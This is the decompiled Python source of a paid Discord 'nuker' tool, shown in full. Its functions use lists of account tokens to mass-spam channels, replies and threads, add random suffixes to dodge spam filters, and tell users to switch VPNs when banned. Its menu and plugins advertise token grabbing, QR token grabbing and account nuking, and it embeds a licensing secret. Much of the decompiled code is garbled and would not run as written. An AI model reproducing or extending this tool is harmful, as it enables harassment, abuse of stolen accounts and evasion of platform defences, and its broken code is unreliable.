# dumped by shivadayoungan (kerely)
import os
import sys
import json
import os.path as os
import hashlib
import platform
import traceback
from time import sleep
from colorama import Fore
from datetime import datetime
from lib2to3.pgen2 import token
from pystyle import Write, Colors
from utilities.Settings.keyauth import api
os.system('cls')
os.system('title Key Login   \\   GANG-Nuker   /  PAID VERSION')
if platform.system() == 'Windows':
    os.system('cls')
elif platform.system() == 'Linux':
    os.system('clear')
elif platform.system() == 'Darwin':
    os.system("clear && printf '\\e[3J'")

def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), 'rb')
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest

keyauthapp = api('GANG-Nuker', '4V5Zpc7rGS', '6e073e4e811d3b4b3ec9881145a404d79b333dc2100bb5245103f69cb6dbbf9f', '1.0', getchecksum(), **('name', 'ownerid', 'secret', 'version', 'hash_to_check'))

def answer():
    key = input('[\x1b[95m>\x1b[95m\x1b[37m] Key?: ')
    keyauthapp.license(key)

answer()
subs = keyauthapp.user_data.subscriptions
for i in range(len(subs)):
    sub = subs[i]['subscription']
    expiry = datetime.utcfromtimestamp(int(subs[i]['expiry'])).strftime('%d-%m-%Y')
    timeleft = subs[i]['timeleft']

try:
    with open('data/login.json') as f:
        config = json.load(f)
        None(None, None, None)
    if not None:
        pass
finally:
    pass
with open('data/login.json', 'w') as f:
    Write.Print('\n[#] Signing into GANG-NUKER PAID\n', Colors.white_to_blue, 0, **('interval',))
    login = Write.Input('[+] Enter A Username: ', Colors.white_to_blue, 0, **('interval',))
    json.dump({
        'Login': login }, f, 4, **('indent',))
    None(None, None, None)
if not None:
    pass

Write.Input(f'''\n[/] Successfully Logged in as: [ {login} ]\n[/] Press ENTER to Continue: ''', Colors.green_to_cyan, 0, **('interval',))
with open('data/login.json') as f:
    config = json.load(f)
    None(None, None, None)
if not None:
    pass
login = config.get('Login')
from utilities.Settings.common import *
import utilities.Plugins.Auto_Login as utilities
import utilities.Plugins.DM_Deleter as utilities
import utilities.Plugins.Token_Info as utilities
import utilities.Plugins.QR_Grabber as utilities
import utilities.Plugins.Account_Nuker as utilities
w = Fore.WHITE
b = Fore.BLACK
g = Fore.LIGHTGREEN_EX
y = Fore.LIGHTYELLOW_EX
m = Fore.LIGHTMAGENTA_EX
c = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX
setTitle('GANG-Nuker PAID    |    Made by ††#9999    |    Use Proxies?')
choice = input('\n\n[\x1b[95m>\x1b[95m\x1b[37m] Would You Like To Use Proxies? [Y/N]: ')
if choice.lower() == 'y' or choice.lower() == 'yes':
    if os.path.basename(sys.argv[0]).endswith('exe'):
        with open(getTempDir() + '\\gang_proxies', 'w'):
            None(None, None, None)
        if not None:
            pass
        clear()
        proxy_scrape()
        sleep(0.3)
    
    try:
        
        try:
            if not sys.version_info >= (3, 9):
                raise None
        print(f'''{Fore.RED}Your Python Version is Not supported: ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}), Please Download v3.9+ to use GANG-Nuker!{Fore.RESET}''')
        sleep(5)
        print('[\x1b[95m1\x1b[95m\x1b[37m] Exiting!')
        sleep(1.5)
        os._exit(0)
        with open(getTempDir() + '\\gang_proxies', 'w'):
            None(None, None, None)
        if not None:
            pass

        clear()
        proxy_scrape()
        sleep(0.3)
    finally:
        Fore.RESET
    if choice.lower() == 'n' or choice.lower() == 'no':
        pass


def Spinner():
    l = [
        '|',
        '/',
        '-',
        '\\',
        ' ']
    for i in l + l + l:
        sys.stdout.write(f'''\r {i}''')
        sys.stdout.flush()
        time.sleep(0.1)


def cls():
    if os.name == 'nt':
        os.system('cls')
        return None
    None(os.system)


def tool():
    if os.name == 'nt':
        os.system('cls')
        return None
    None(os.system)


def clearConsole():
    if os.name in ('nt', 'dos'):
        return os.system('cls')
    return None(os.system)


def useragent():
    file = open('data/useragent.txt', 'r')
    useragent = random.choice(list(file))
    useragent2 = []
    useragent2.append(useragent)
    useragent1 = []

import os
import time
import emoji
import shutil
import tasksio
import zipfile
import datetime
import colorama
import requests
import easygui
import os
import random
import json
import random
import string
from time import sleep
from json import loads
from json import dumps
import ctypes
import os
import sys
import string
import pyautogui
import base64
import pyperclip
from typing import Union
import webbrowser
import base64
from colorama import Fore
import requests
import websocket
import requests
import threading
from itertools import cycle
from tasksio import TaskPool
from tqdm import tqdm, trange
from datetime import datetime
from selenium import webdriver
from websocket import WebSocket
from os.path import isfile, join
from twocaptcha import TwoCaptcha
from colorama import Back, Fore, Style
from httpx_socks import AsyncProxyTransport
from concurrent.futures import ThreadPoolExecutor
from random_user_agent.user_agent import UserAgent
import threading
import cloudscraper
import time
import re
import httpx
import json
import os

try:
    import requests
finally:
    pass
os.system('pip install requests')
import requests

try:
    from requests import get
finally:
    pass
os.system('pip install requests')
from requests import get

try:
    import colorama
finally:
    pass
os.system('pip install colorama')
import colorama

try:
    import discord
finally:
    pass
os.system('pip install discord')
import discord
from discord.ext import commands

try:
    import pyautogui
finally:
    pass
os.system('pip install pyautogui')
import pyautogui

try:
    import http.client as http
finally:
    pass
os.system('pip install python-http-client')
import http.client as http

try:
    import json
finally:
    pass
os.system('pip install json')
import json

try:
    import base64
finally:
    pass
os.system('pip install base64')
import base64

try:
    import emoji as ej
finally:
    pass
os.system('pip install emoji')
import emoji as ej

try:
    import websocket
finally:
    pass
os.system('pip install websocket')
import websocket

try:
    import asyncio
finally:
    pass
os.system('pip install asyncio')
import asyncio

try:
    from bs4 import BeautifulSoup
finally:
    pass
os.system('pip install beautifulsoup4')

try:
    from webdriver_manager.chrome import ChromeDriverManager
finally:
    pass
os.system('pip install webdriver-manager')
from webdriver_manager.chrome import ChromeDriverManager

try:
    from PIL import Image
finally:
    pass
os.system('pip install pillow')
from PIL import Image

try:
    import discum
finally:
    pass
os.system('pip install discum')
import discum

try:
    from selenium import webdriver
finally:
    pass
os.system('pip install selenium')
from selenium import webdriver
lock = threading.Lock()
os.system('mode 120,30')
threads = 3
ur = 'https://discord.com/api/v9/channels/messages'
tokens = open('tokens.txt', 'r').read().splitlines()

def log_msg(message):
    
    try:
        requests.post('http://127.0.0.1:5000/log', {
            'log': message }, **('data',))
    finally:
        return None
        return None



def log(message):
    threading.Thread(log_msg, (message,), **('target', 'args')).start()


def online(token, game):
    ws = websocket.WebSocket()
    status = 'idle'
    ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
    hello = json.loads(ws.recv())
    heartbeat_interval = hello['d']['heartbeat_interval']
    gamejson = {
        'name': game,
        'type': 0 }
    auth = {
        'op': 2,
        'd': {
            'token': token,
            'properties': {
                '$os': sys.platform,
                '$browser': 'RTB',
                '$device': f'''{sys.platform} Device''' },
            'presence': {
                'game': gamejson,
                'status': status,
                'since': 0,
                'afk': False } },
        's': None,
        't': None }
    ws.send(json.dumps(auth))
    log(colorama.Fore.WHITE + '[+] Set status as: ' + game + ' [' + token + ']')
    ack = {
        'op': 1,
        'd': None }
    time.sleep(heartbeat_interval / 1000)
    
    try:
        ws.send(json.dumps(ack))
    finally:
        pass
    e = None
    
    try:
        
        try:
            pass
        finally:
            e = None
            del e
            e = None
            del e
            return None
            e = None
            del e
            e = None
            del e
            continue





def loading_print(final_text):
    text = ''
    for character in final_text:
        sys.stdout.write(character)
        time.sleep(0.025)


def fastspam(token, channel_id, text, antispam, amount):
    og_text = text
    request = requests.Session()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36' }
    for x in range(int(amount)):
        if 5 > 5:
            pass
        elif antispam:
            text += ''
        payload = {
            'content': text,
            'tts': False }
        src = request.post(f'''https://canary.discordapp.com/api/v6/channels/{channel_id}/messages''', headers, payload, 10, **('headers', 'json', 'timeout'))
        if src.status_code == 429:
            
            try:
                ratelimit = json.loads(src.content)
                time.sleep(float(ratelimit['retry_after'] / 1000))
            finally:
                continue
                continue
                if src.status_code == 401:
                    return None
                if None.status_code == 404:
                    return None
                return None



def set_mping(msg):
    print(msg)


def scrape_channels(server, token):
    
    try:
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36' }
        data = requests.get(f'''https://canary.discord.com/api/v8/guilds/{server}/channels''', headers, 10, **('headers', 'timeout')).json()
        channel_ids = []
        
        try:
            for channel in data:
                channel_ids.append(channel['id'])
        finally:
            return channel_ids
            log(colorama.Fore.RED + f'''[-] Discord propably API banned this IP. Use a VPN. Error: {data.text} [{token}]''')
            return channel_ids
            Exception
            e = None
            
            try:
                
                try:
                    log(colorama.Fore.RED + f'''[-] Discord propably CloudFlare banned this IP. Use a VPN. Error: {str(e)} [{token}]''')
                finally:
                    e = None
                    del e
                e = None
                del e
                e = None
                del e
                return None
                e = None
                del e






def multispammer(tokens, guild_id, text, antispam, delay, amount):
    og_text = text
    channels = scrape_channels(guild_id, random.choice(tokens))
    for channel in channels:
        threading.Thread(spam, (tokens, channel, text, antispam, delay, amount), **('target', 'args')).start()


def spam(tokens, channel_id, text, antispam, delay, amount):
    for x in range(int(amount)):
        token = random.choice(tokens)
        threading.Thread(send_message, (token, channel_id, text, antispam), **('target', 'args')).start()
        sleep(delay)


def send_message(token, channel_id, text, antispam):
    og_text = text
    request = requests.Session()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36' }
    if antispam:
        text += ' | ' + ''.join(random.choices(string.ascii_lowercase + string.digits, 10, **('k',)))
    payload = {
        'content': text,
        'tts': False }
    src = request.post(f'''https://canary.discordapp.com/api/v6/channels/{channel_id}/messages''', headers, payload, 10, **('headers', 'json', 'timeout'))
    if src.status_code == 429:
        
        try:
            ratelimit = json.loads(src.content)
            log(colorama.Fore.RED + '[-] Ratelimit for ' + str(float(ratelimit['retry_after'] / 1000)) + ' seconds! [' + token + ']')
        finally:
            pass
        e = None
        
        try:
            
            try:
                log(colorama.Fore.RED + f'''[-] Discord propably CloudFlare banned this IP. Use a VPN. Error: {str(e)} [{token}]''')
                continue
                e = None
                del e
                e = None
                del e
                if src.status_code == 200:
                    log(colorama.Fore.WHITE + '[+] Message sent! [' + token + ']')
                    return src
                None(colorama.Fore.RED + f'''[-] Discord propably API, or CloudFlare banned this IP. Use a VPN. Error: {src.text} [{token}]''')
                return src
                return None





def replyspammer(token, channel_id, message_id, text, amount):
    og_text = text
    request = requests.Session()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36' }
    for x in range(int(amount)):
        if 5 > 5:
            pass
        else:
            payload = {
                'content': text,
                'tts': False }
            payload['message_reference'] = {
                'channel_id': channel_id,
                'message_id': message_id }
            src = request.post(f'''https://canary.discordapp.com/api/v6/channels/{channel_id}/messages''', headers, payload, 10, **('headers', 'json', 'timeout'))
        if src.status_code == 429:
            
            try:
                ratelimit = json.loads(src.content)
                time.sleep(float(ratelimit['retry_after'] / 1000))
            finally:
                continue
                continue
                if src.status_code == 401:
                    continue
                if src.status_code == 404:
                    continue
                if src.status_code == 403:
                    pass
                continue
                return None



def thread_spammer(channel_id, message, thread_name, token, amount):
    
    try:
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-GB',
            'authorization': token,
            'content-length': '90',
            'content-type': 'application/json',
            'cookie': f'''__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US''',
            'origin': 'https://discord.com',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9' }
        for x in range(int(amount)):
            
            try:
                thread_name_new = thread_name + ' | ' + ''.join(random.choices(string.ascii_lowercase + string.digits, 10, **('k',)))
                data = {
                    'name': thread_name_new,
                    'type': '11',
                    'auto_archive_duration': '1440',
                    'location': 'Thread Browser Toolbar' }
                out = requests.post(f'''https://discord.com/api/v9/channels/{str(channel_id)}/threads''', headers, data, **('headers', 'json'))
                if out.status_code == 429:
                    
                    try:
                        ratelimit = json.loads(out.content)
                        time.sleep(float(ratelimit['retry_after'] / 1000))
                    finally:
                        pass
                    thread_id = out.json()['id']
                    log(colorama.Fore.WHITE + '[+] Thread ' + thread_name + ' created! [' + token + ']')
                    send_message(token, thread_id, message, False)
                    continue
                    Exception
                    e = None
                    
                    try:
                        
                        try:
                            pass
                        finally:
                            e = None
                            del e
                        e = None
                        del e
                        e = None
                        del e
                        continue
                        e = None
                        del e
                        return None
                        e = None
                        
                        try:
                            
                            try:
                                log(colorama.Fore.RED + f'''[-] Discord propably CloudFlare banned this IP. Use a VPN. Error: {str(e)} [{token}]''')
                            finally:
                                e = None
                                del e
                            e = None
                            del e
                            e = None
                            del e
                            return None
                            e = None
                            del e









def emojisend_message(token, channel_id, text):
    request = requests.Session()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36' }
    if 5 > 5:
        text += ' | ' + ''.join(random.choices(string.ascii_lowercase + string.digits, 10, **('k',)))
    payload = {
        'content': text,
        'tts': False }
    src = request.post(f'''https://canary.discordapp.com/api/v6/channels/{channel_id}/messages''', headers, payload, 10, **('headers', 'json', 'timeout'))
    if src.status_code == 429:
        
        try:
            ratelimit = json.loads(src.content)
            log(colorama.Fore.RED + '[-] Ratelimit for ' + str(float(ratelimit['retry_after'] / 1000)) + ' seconds! [' + token + ']')
        finally:
            pass
        e = None
        
        try:
            
            try:
                log(colorama.Fore.RED + f'''[-] Discord propably CloudFlare banned this IP. Use a VPN. Error: {str(e)} [{token}]''')
            finally:
                e = None
                del e
            e = None
            del e
            e = None
            del e
            e = None
            del e
            if src.status_code == 200:
                log(colorama.Fore.WHITE + '[+] Message sent! [' + token + ']')
                return src
            return src
            return None





def emojifastspam(token, channel_id, text, amount):
    og_text = text
    request = requests.Session()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36' }
    for x in range(int(amount)):
        if 5 > 5:
            pass
        else:
            payload = {
                'content': text,
                'tts': False }
            src = request.post(f'''https://canary.discordapp.com/api/v6/channels/{channel_id}/messages''', headers, payload, 10, **('headers', 'json', 'timeout'))
        if src.status_code == 429:
            
            try:
                ratelimit = json.loads(src.content)
                time.sleep(float(ratelimit['retry_after'] / 1000))
            finally:
                continue
                continue
                if src.status_code == 401:
                    return None
                if None.status_code == 404:
                    return None
                if None.status_code == 403:
                    return None
                return None



def changeFormat(token = None):
    if ':' not in token or len(token.split(':')) == 2:
        token = token if ':' not in token else token.split(':')[1]
        print(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] {token} format is not [{Fore.LIGHTRED_EX}Email:Pass:Token{Fore.RESET}]''')
        return token
    newToken = None.split(':')[2]
    print(f'''[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Changed Format to | {newToken[:63]}*********''')
    return newToken


def emojispam(tokens, channel_id, text, delay, amount):
    for x in range(int(amount)):
        token = random.choice(tokens)
        if 5 > 5:
            continue
        threading.Thread(emojisend_message, (token, channel_id, text), **('target', 'args')).start()
        sleep(delay)


def randstr(lenn):
    alpha = 'abcdefghijklmnopqrstuvwxyz0123456789'
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text


def mainHeader(token):
    return {
        'authorization': token,
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-GB',
        'content-length': '90',
        'content-type': 'application/json',
        'cookie': f'''__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US''',
        'origin': 'https://discord.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9' }


def secondHeader(token):
    return {
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MTYiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjQ1OCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5ODgyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=' }


def spammer():
    global threads, threads
    asc = asyncio.get_event_loop()
    tokens = open('tokens.txt', 'r').read().splitlines()
    counttokens = len(open('tokens.txt').readlines())
    
    clear = lambda : os.system('cls')
    clear()
    colorama.init()
    Write.Print(f'''{login}\nExpiry: {expiry}''', Colors.blue_to_purple, 0, **('interval',))
    print('')
    print('')
    Write.Print('                                      /$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$\n', Colors.purple_to_blue, 0, **('interval',))
    Write.Print('                                     /$$__  $$ /$$__  $$| $$$ | $$ /$$__  $$\n', Colors.purple_to_blue, 0, **('interval',))
    Write.Print('                                    | $$  \\__/| $$  \\ $$| $$$$| $$| $$  \\__/\n', Colors.purple_to_blue, 0, **('interval',))
    Write.Print('                                    | $$ /$$$$| $$$$$$$$| $$ $$ $$| $$ /$$$$\n', Colors.purple_to_blue, 0, **('interval',))
    Write.Print('                                    | $$|_  $$| $$__  $$| $$  $$$$| $$|_  $$\n', Colors.purple_to_blue, 0, **('interval',))
    Write.Print(f''' > [v{THIS_VERSION}]                         | $$  \\ $$| $$  | $$| $$\\  $$$| $$  \\ $$\n''', Colors.purple_to_blue, 0, **('interval',))
    Write.Print(' > [gangnuker.org]                  |  $$$$$$/| $$  | $$| $$ \\  $$|  $$$$$$/\n', Colors.purple_to_blue, 0, **('interval',))
    Write.Print(' > [Github.com/TT-Tutorials]         \\______/ |__/  |__/|__/  \\__/ \\______/ \n', Colors.purple_to_blue, 0, **('interval',))
    Write.Print('════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════', Colors.purple_to_blue, 0, **('interval',))
    []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        